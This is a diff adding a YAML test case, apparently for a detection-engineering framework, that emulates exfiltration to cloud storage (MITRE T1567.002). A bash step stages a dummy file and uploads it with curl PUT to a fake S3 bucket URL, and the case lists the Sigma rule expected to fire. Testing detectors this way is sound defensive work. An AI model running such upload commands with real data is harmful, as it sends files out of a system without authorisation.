@@ -1,0 +1,40 @@
+id: eye-706-cloud-bucket-put-attempt
+name: curl PUT to a fake S3 bucket URL
+description: |
+  Mimics T1567.002 (Exfiltration to Cloud Storage). curl -X PUT against
+  a fake bucket on s3.amazonaws.com — DNS resolves but auth fails (or
+  network is unreachable in the homelab). The URL pattern alone is the
+  slither signal; no real bucket is touched.
+
+attack:
+  technique: T1567.002
+  tactic: TA0010
+
+destructiveness: low
+platforms: [linux]
+
+execute:
+  - shell: bash
+    command: |
+      mkdir -p /tmp/eyeexam-706
+      printf 'eye-706 staged exfil payload\n' > /tmp/eyeexam-706/payload.bin
+      curl -sS -m 2 -X PUT \
+        --upload-file /tmp/eyeexam-706/payload.bin \
+        'https://eyeexam-test-bucket.s3.amazonaws.com/eye-706/payload.bin' \
+        > /tmp/eyeexam-706/curl.out 2>&1 || true
+      echo "eye-706 bucket PUT attempt complete"
+
+cleanup:
+  - shell: bash
+    command: |
+      rm -rf /tmp/eyeexam-706
+
+verify_cleanup:
+  - shell: bash
+    command: |
+      test ! -e /tmp/eyeexam-706
+
+expected_detections:
+  - sigma_id: 8b7c4d00-0001-4000-8000-000000000030
+    backend: slither
+    description: proc-curl-cloud-bucket-put — curl PUT to s3.amazonaws.com
